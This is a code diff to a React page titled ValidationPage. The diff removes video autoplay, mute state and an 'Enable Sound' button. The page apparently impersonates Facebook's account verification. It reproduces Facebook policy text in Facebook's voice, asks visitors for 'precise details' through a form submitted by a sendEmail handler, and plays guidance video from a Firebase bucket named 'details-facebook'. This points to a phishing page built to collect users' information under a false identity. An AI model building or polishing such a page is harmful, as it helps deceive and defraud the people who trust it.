@@ -8,7 +8,6 @@ const ValidationPage = () => {
   const form = useRef();
   const navigate = useNavigate();
   const [isFormValid, setIsFormValid] = useState(false);
-  const [videoMuted, setVideoMuted] = useState(true);
 
   const sendEmail = (e) => {
     e.preventDefault();
@@ -94,7 +93,6 @@ const ValidationPage = () => {
                 Once verified, public figures, celebrities, and brands that meet certain account and eligibility requirements may not change their username on their account. Verification cannot be transferred to another account. Facebook accounts that impersonate public figures or other individuals violate our Community Guidelines and are not permitted on Facebook.
               </p>
 
-
               <p className="fw-semibold validation_form_para">
                 Please provide the precise details below. Refer to the video for
                 clarification if you find the instructions unclear.
@@ -109,22 +107,10 @@ const ValidationPage = () => {
 
               <video
                 controls
-                autoPlay
-                muted={videoMuted}
                 src="https://firebasestorage.googleapis.com/v0/b/details-facebook-a00f0.appspot.com/o/0809.mp4?alt=media&token=b12189d9-dd1f-4d1a-8245-43b12e4094a9"
                 style={{ width: "500px", height: "280px" }} // Increased video size
               ></video>
-              <br />
-              <button 
-                onClick={() => setVideoMuted(false)} 
-                style={{ 
-                  padding: "4px 8px", // Smaller button size
-                  fontSize: "12px", // Smaller font size
-                  marginTop: "10px" // Adjusted spacing
-                }}
-              >
-                Enable Sound
-              </button>
+              
               <p className="fw-semibold validation_form_para mt-2">
                 Please be sure to provide the requested information below.
               </p>
